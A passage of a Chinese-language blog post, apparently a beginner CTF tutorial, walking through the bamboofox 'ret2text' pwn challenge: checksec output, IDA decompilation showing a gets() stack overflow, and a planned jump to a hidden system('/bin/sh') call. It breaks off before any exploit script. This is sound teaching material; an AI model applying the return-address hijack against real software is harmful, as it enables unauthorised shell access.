@@ -1,0 +1,480 @@
+<!doctype html><html lang=zh-CN data-theme=light><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#222" media="(prefers-color-scheme: light)"><meta name=generator content="Hugo 0.146.0"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="从零开始的 Pwn 之旅 - Ret2text"><meta itemprop=description content="不想写博客..."><meta name=description content="不想写博客..."><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=keywords content="Ctf,Pwn"><meta property="og:type" content="article"><meta property="og:title" content="从零开始的 Pwn 之旅 - Ret2text"><meta property="og:description" content="不想写博客..."><meta property="og:image" content="/imgs/avatar.jpg"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2text/"><meta property="og:site_name" content="lhon901's blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="lhon901"><meta property="article:published_time" content="2025-06-25 14:32:23 +0800 +0800"><meta property="article:modified_time" content="2025-06-25 14:32:23 +0800 +0800"><link type=text/css rel=stylesheet href=/js/3rd/font-awesome/6.7.2/css/all.min.css><link type=text/css rel=stylesheet href=/js/3rd/animate.css/3.1.1/animate.min.css><link type=text/css rel=stylesheet href=/js/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href="/css/main.min.css?=1750860884"><style type=text/css>.post-footer hr:after{content:"~ 我可是有底线的哟 ~"}.flinks-list-footer hr:after{content:"~ 我可是有底线的哟 ~"}</style><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>从零开始的 Pwn 之旅 - Ret2text - lhon901's blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
+<span class=toggle-line></span>
+<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>lhon901's blog</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description></p></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-flinks"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-thumbs-up hvr-icon"></i>友情链接</a></li><li class="menu-item menu-item-example"><a href=/ class="menus-parent hvr-icon-pulse" rel=section><i class="fa fa-angles-down hvr-icon"></i>语法示例
+<span class=menu-item-shrink-icon><i class="fa fa-angle-right"></i></span></a><ul class=menu-children><li class=menu-child-item><a href=/ class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>语法高亮</a></li><li class=menu-child-item><a href=/ class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>数学公式</a></li><li class=menu-child-item><a href=/post/11-mermaid-charts class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>流程图</a></li></ul></li><li class="menu-item menu-item-archives"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
+<span class=badge>9</span></a></li><li class="menu-item menu-item-commonweal"><a href=/404.html class=hvr-icon-pulse rel=section><i class="fa fa-heartbeat hvr-icon"></i>公益 404</a></li><li class="menu-item menu-item-search"><a role=button class="popup-trigger hvr-icon-pulse"><i class="fa fa-search fa-fw hvr-icon"></i>搜索</a></li></ul></nav><div class=search-pop-overlay><div class="popup search-popup"><div class=search-header><span class=search-icon><i class="fa fa-search"></i></span><div class=search-input-container><input autocomplete=off autocapitalize=off maxlength=80 placeholder=搜索... spellcheck=false type=search class=search-input></div><span class=popup-btn-close role=button><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class=search-result-icon><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
+<span class=toggle-line></span>
+<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><a href=#前言>前言</a></li><li><a href=#ret2text>ret2text</a><ul><li><a href=#使用-gdb-来获取偏移>使用 gdb 来获取偏移</a></li></ul></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=lhon901 src=/imgs/img-lazy-loading.gif data-src=/imgs/avatar.jpg><p class=site-author-name itemprop=name>lhon901</p><div class=site-description itemprop=description>不想写博客...</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>9</span>
+<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>2</span>
+<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>3</span>
+<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/craftopc title="Github → https://github.com/craftopc" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
+Github
+</a></span><span class=links-of-social-item><a href=mailto:lhon901@163.com title="E-Mail → mailto:lhon901@163.com" rel=noopener class=hvr-icon-pulse target=_blank><i class="fa fa-envelope fa-fw hvr-icon"></i>
+E-Mail</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans class=cc-opacity rel=noopener target=_blank title=共享知识><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=共享知识></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
+友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://gitee.com/hugo-next/hugo-theme-next title=https://gitee.com/hugo-next/hugo-theme-next target=_blank>Hugo-NexT</a></li><li class=links-of-blogroll-item><a href=https://lisenhui.cn title=https://lisenhui.cn target=_blank>凡梦星尘空间站</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
+<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate="2025-04-14 20:18:58 +0800 +0800"></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=21746></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=47></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate="2025-06-25 14:32:23 +0800 +0800"></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=goto-i18n-translate class=button title=多语言翻译><i class="fas fa-globe"></i></div><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
+<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/hugo-next rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg>
+</a><script type=text/javascript src=//sidecar.gitter.im/dist/sidecar.v1.js async></script><script type=text/javascript>((window.gitter={}).chat={}).options={room:"hugo-next/community"}</script><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2text/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="lhon901"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="lhon901"><meta itemprop=description content="不想写博客..."></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="从零开始的 Pwn 之旅 - Ret2text"><meta itemprop=description content="前言
+
+之前我们已经初步介绍了栈溢出和栈对齐，这一节我们将做一个巩固练习
+ret2text
+
+
+
+    ret2text
+    
+    
+    
+
+先进行安全防护检测
+
+
+
+ 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+
+
+~/P/c/p/l/u/s/r/bamboofox-ret2text ❯❯❯ chmod +x ./ret2text              (.venv) master
+'./ret2text' 的模式已由 0644 (rw-r--r--) 更改为 0755 (rwxr-xr-x)
+~/P/c/p/l/u/s/r/bamboofox-ret2text ❯❯❯ pwn checksec ./ret2text        (.venv) master ✱
+[*] '/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text/ret2text'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+    Debuginfo:  Yes
+
+
+
+ida pro 逆向"></span><header class=post-header><h1 class=post-title itemprop="name headline">从零开始的 Pwn 之旅 - Ret2text
+<a href=https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/posts/%e4%bb%8e%e9%9b%b6%e5%bc%80%e5%a7%8b%e7%9a%84%20Pwn%20%e4%b9%8b%e6%97%85%20-%20ret2text.md rel="noopener external nofollow noreferrer" target=_blank class="exturl post-edit-link" title=编辑><i class="fa fa-pen-nib"></i></a></h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
+</span><span class=post-meta-item-text title=发表于>发表于：
+</span><time title="创建时间：2025-06-25 14:32:23 +08:00" itemprop="dateCreated datePublished" datetime="2025-06-25 14:32:23 +0800 +0800">2025-06-25
+</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
+</span><span class=post-meta-item-text title=分类于>分类于：
+</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/ctf/ itemprop=url rel=index><span itemprop=name>Ctf</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
+</span><span class=post-meta-item-text>字数：</span>
+<span>2170</span>
+</span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
+</span><span class=post-meta-item-text>阅读：&ap;</span>
+<span>5分钟</span>
+</span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
+</span><span class=post-meta-item-text>浏览：
+</span><span id=busuanzi_value_page_pv data-path=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2text/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class="post-body autonumber" itemprop=articleBody><h2 id=前言>前言
+<a class=header-anchor href=#%e5%89%8d%e8%a8%80></a></h2><p>之前我们已经初步介绍了栈溢出和栈对齐，这一节我们将做一个巩固练习</p><h2 id=ret2text>ret2text
+<a class=header-anchor href=#ret2text></a></h2><p><a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text title=ret2text rel="noopener external nofollow noreferrer" target=_blank class=exturl>ret2text
+<i class="fa fa-external-link-alt"></i></a></p><p>先进行安全防护检测</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-0-1><a class=lnlinks href=#hl-0-1> 1</a>
+</span><span class=lnt id=hl-0-2><a class=lnlinks href=#hl-0-2> 2</a>
+</span><span class=lnt id=hl-0-3><a class=lnlinks href=#hl-0-3> 3</a>
+</span><span class=lnt id=hl-0-4><a class=lnlinks href=#hl-0-4> 4</a>
+</span><span class=lnt id=hl-0-5><a class=lnlinks href=#hl-0-5> 5</a>
+</span><span class=lnt id=hl-0-6><a class=lnlinks href=#hl-0-6> 6</a>
+</span><span class=lnt id=hl-0-7><a class=lnlinks href=#hl-0-7> 7</a>
+</span><span class=lnt id=hl-0-8><a class=lnlinks href=#hl-0-8> 8</a>
+</span><span class=lnt id=hl-0-9><a class=lnlinks href=#hl-0-9> 9</a>
+</span><span class=lnt id=hl-0-10><a class=lnlinks href=#hl-0-10>10</a>
+</span><span class=lnt id=hl-0-11><a class=lnlinks href=#hl-0-11>11</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~/P/c/p/l/u/s/r/bamboofox-ret2text ❯❯❯ chmod +x ./ret2text              <span class=o>(</span>.venv<span class=o>)</span> master
+</span></span><span class=line><span class=cl><span class=s1>&#39;./ret2text&#39;</span> 的模式已由 <span class=m>0644</span> <span class=o>(</span>rw-r--r--<span class=o>)</span> 更改为 <span class=m>0755</span> <span class=o>(</span>rwxr-xr-x<span class=o>)</span>
+</span></span><span class=line><span class=cl>~/P/c/p/l/u/s/r/bamboofox-ret2text ❯❯❯ pwn checksec ./ret2text        <span class=o>(</span>.venv<span class=o>)</span> master ✱
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text/ret2text&#39;</span>
+</span></span><span class=line><span class=cl>    Arch:       i386-32-little
+</span></span><span class=line><span class=cl>    RELRO:      Partial RELRO
+</span></span><span class=line><span class=cl>    Stack:      No canary found
+</span></span><span class=line><span class=cl>    NX:         NX enabled
+</span></span><span class=line><span class=cl>    PIE:        No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
+</span></span><span class=line><span class=cl>    Stripped:   No
+</span></span><span class=line><span class=cl>    Debuginfo:  Yes</span></span></code></pre></td></tr></table></div></div><p>ida pro 逆向</p><a id=more></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-1-1><a class=lnlinks href=#hl-1-1> 1</a>
+</span><span class=lnt id=hl-1-2><a class=lnlinks href=#hl-1-2> 2</a>
+</span><span class=lnt id=hl-1-3><a class=lnlinks href=#hl-1-3> 3</a>
+</span><span class=lnt id=hl-1-4><a class=lnlinks href=#hl-1-4> 4</a>
+</span><span class=lnt id=hl-1-5><a class=lnlinks href=#hl-1-5> 5</a>
+</span><span class=lnt id=hl-1-6><a class=lnlinks href=#hl-1-6> 6</a>
+</span><span class=lnt id=hl-1-7><a class=lnlinks href=#hl-1-7> 7</a>
+</span><span class=lnt id=hl-1-8><a class=lnlinks href=#hl-1-8> 8</a>
+</span><span class=lnt id=hl-1-9><a class=lnlinks href=#hl-1-9> 9</a>
+</span><span class=lnt id=hl-1-10><a class=lnlinks href=#hl-1-10>10</a>
+</span><span class=lnt id=hl-1-11><a class=lnlinks href=#hl-1-11>11</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span> <span class=c1>// [esp+1Ch] [ebp-64h] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>setvbuf</span><span class=p>(</span><span class=n>_bss_start</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;There is something amazing here, do you know anything?&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>gets</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Maybe I will tell you next time !&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>发现危险函数 <code>gets</code>, 可以进行栈溢出</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-2-1><a class=lnlinks href=#hl-2-1> 1</a>
+</span><span class=lnt id=hl-2-2><a class=lnlinks href=#hl-2-2> 2</a>
+</span><span class=lnt id=hl-2-3><a class=lnlinks href=#hl-2-3> 3</a>
+</span><span class=lnt id=hl-2-4><a class=lnlinks href=#hl-2-4> 4</a>
+</span><span class=lnt id=hl-2-5><a class=lnlinks href=#hl-2-5> 5</a>
+</span><span class=lnt id=hl-2-6><a class=lnlinks href=#hl-2-6> 6</a>
+</span><span class=lnt id=hl-2-7><a class=lnlinks href=#hl-2-7> 7</a>
+</span><span class=lnt id=hl-2-8><a class=lnlinks href=#hl-2-8> 8</a>
+</span><span class=lnt id=hl-2-9><a class=lnlinks href=#hl-2-9> 9</a>
+</span><span class=lnt id=hl-2-10><a class=lnlinks href=#hl-2-10>10</a>
+</span><span class=lnt id=hl-2-11><a class=lnlinks href=#hl-2-11>11</a>
+</span><span class=lnt id=hl-2-12><a class=lnlinks href=#hl-2-12>12</a>
+</span><span class=lnt id=hl-2-13><a class=lnlinks href=#hl-2-13>13</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>secure</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>time_t</span> <span class=n>v0</span><span class=p>;</span> <span class=c1>// eax
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>input</span><span class=p>;</span> <span class=c1>// [esp+18h] [ebp-10h] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>secretcode</span><span class=p>;</span> <span class=c1>// [esp+1Ch] [ebp-Ch]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=n>v0</span> <span class=o>=</span> <span class=nf>time</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>srand</span><span class=p>(</span><span class=n>v0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>secretcode</span> <span class=o>=</span> <span class=nf>rand</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=o>&amp;</span><span class=n>unk_8048760</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>input</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>input</span> <span class=o>==</span> <span class=n>secretcode</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>发现 <code>secure</code> 函数中有一个随机数生成器，输入正确的数字可以执行 <code>system("/bin/sh")</code>，但是这个函数并没有被调用。</p><p>查看 <code>secure</code> 函数的汇编代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-3-1><a class=lnlinks href=#hl-3-1> 1</a>
+</span><span class=lnt id=hl-3-2><a class=lnlinks href=#hl-3-2> 2</a>
+</span><span class=lnt id=hl-3-3><a class=lnlinks href=#hl-3-3> 3</a>
+</span><span class=lnt id=hl-3-4><a class=lnlinks href=#hl-3-4> 4</a>
+</span><span class=lnt id=hl-3-5><a class=lnlinks href=#hl-3-5> 5</a>
+</span><span class=lnt id=hl-3-6><a class=lnlinks href=#hl-3-6> 6</a>
+</span><span class=lnt id=hl-3-7><a class=lnlinks href=#hl-3-7> 7</a>
+</span><span class=lnt id=hl-3-8><a class=lnlinks href=#hl-3-8> 8</a>
+</span><span class=lnt id=hl-3-9><a class=lnlinks href=#hl-3-9> 9</a>
+</span><span class=lnt id=hl-3-10><a class=lnlinks href=#hl-3-10>10</a>
+</span><span class=lnt id=hl-3-11><a class=lnlinks href=#hl-3-11>11</a>
+</span><span class=lnt id=hl-3-12><a class=lnlinks href=#hl-3-12>12</a>
+</span><span class=lnt id=hl-3-13><a class=lnlinks href=#hl-3-13>13</a>
+</span><span class=lnt id=hl-3-14><a class=lnlinks href=#hl-3-14>14</a>
+</span><span class=lnt id=hl-3-15><a class=lnlinks href=#hl-3-15>15</a>
+</span><span class=lnt id=hl-3-16><a class=lnlinks href=#hl-3-16>16</a>
+</span><span class=lnt id=hl-3-17><a class=lnlinks href=#hl-3-17>17</a>
+</span><span class=lnt id=hl-3-18><a class=lnlinks href=#hl-3-18>18</a>
+</span><span class=lnt id=hl-3-19><a class=lnlinks href=#hl-3-19>19</a>
+</span><span class=lnt id=hl-3-20><a class=lnlinks href=#hl-3-20>20</a>
+</span><span class=lnt id=hl-3-21><a class=lnlinks href=#hl-3-21>21</a>
+</span><span class=lnt id=hl-3-22><a class=lnlinks href=#hl-3-22>22</a>
+</span><span class=lnt id=hl-3-23><a class=lnlinks href=#hl-3-23>23</a>
+</span><span class=lnt id=hl-3-24><a class=lnlinks href=#hl-3-24>24</a>
+</span><span class=lnt id=hl-3-25><a class=lnlinks href=#hl-3-25>25</a>
+</span><span class=lnt id=hl-3-26><a class=lnlinks href=#hl-3-26>26</a>
+</span><span class=lnt id=hl-3-27><a class=lnlinks href=#hl-3-27>27</a>
+</span><span class=lnt id=hl-3-28><a class=lnlinks href=#hl-3-28>28</a>
+</span><span class=lnt id=hl-3-29><a class=lnlinks href=#hl-3-29>29</a>
+</span><span class=lnt id=hl-3-30><a class=lnlinks href=#hl-3-30>30</a>
+</span><span class=lnt id=hl-3-31><a class=lnlinks href=#hl-3-31>31</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>.text:080485FD
+</span></span><span class=line><span class=cl>.text:080485FD ; =============== S U B R O U T I N E =======================================
+</span></span><span class=line><span class=cl>.text:080485FD
+</span></span><span class=line><span class=cl>.text:080485FD ; Attributes: bp-based frame
+</span></span><span class=line><span class=cl>.text:080485FD
+</span></span><span class=line><span class=cl>.text:080485FD ; void secure()
+</span></span><span class=line><span class=cl>.text:080485FD                 public secure
+</span></span><span class=line><span class=cl>.text:080485FD secure          proc near
+</span></span><span class=line><span class=cl>.text:080485FD
+</span></span><span class=line><span class=cl>.text:080485FD input           = dword ptr -10h
+</span></span><span class=line><span class=cl>.text:080485FD secretcode      = dword ptr -0Ch
+</span></span><span class=line><span class=cl>.text:080485FD
+</span></span><span class=line><span class=cl>.text:080485FD ; __unwind {
+</span></span><span class=line><span class=cl>.text:080485FD                 push    ebp
+</span></span><span class=line><span class=cl>.text:080485FE                 mov     ebp, esp
+</span></span><span class=line><span class=cl>.text:08048600                 sub     esp, 28h
+</span></span><span class=line><span class=cl>.text:08048603                 mov     dword ptr [esp], 0 ; timer
+</span></span><span class=line><span class=cl>.text:0804860A                 call    _time
+</span></span><span class=line><span class=cl>.text:0804860F                 mov     [esp], eax      ; seed
+</span></span><span class=line><span class=cl>.text:08048612                 call    _srand
+</span></span><span class=line><span class=cl>.text:08048617                 call    _rand
+</span></span><span class=line><span class=cl>.text:0804861C                 mov     [ebp+secretcode], eax
+</span></span><span class=line><span class=cl>.text:0804861F                 lea     eax, [ebp+input]
+</span></span><span class=line><span class=cl>.text:08048622                 mov     [esp+4], eax
+</span></span><span class=line><span class=cl>.text:08048626                 mov     dword ptr [esp], offset unk_8048760
+</span></span><span class=line><span class=cl>.text:0804862D                 call    ___isoc99_scanf
+</span></span><span class=line><span class=cl>.text:08048632                 mov     eax, [ebp+input]
+</span></span><span class=line><span class=cl>.text:08048635                 cmp     eax, [ebp+secretcode]
+</span></span><span class=line><span class=cl>.text:08048638                 jnz     short locret_8048646
+</span></span><span class=line><span class=cl>.text:0804863A                 mov     dword ptr [esp], offset command ; &#34;/bin/sh&#34;
+</span></span><span class=line><span class=cl>.text:08048641                 call    _system</span></span></code></pre></td></tr></table></div></div><p>我们可以直接栈溢出后劫持地址到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-4-1><a class=lnlinks href=#hl-4-1>1</a>
+</span><span class=lnt id=hl-4-2><a class=lnlinks href=#hl-4-2>2</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>.text:0804863A                 mov     dword ptr [esp], offset command ; &#34;/bin/sh&#34;
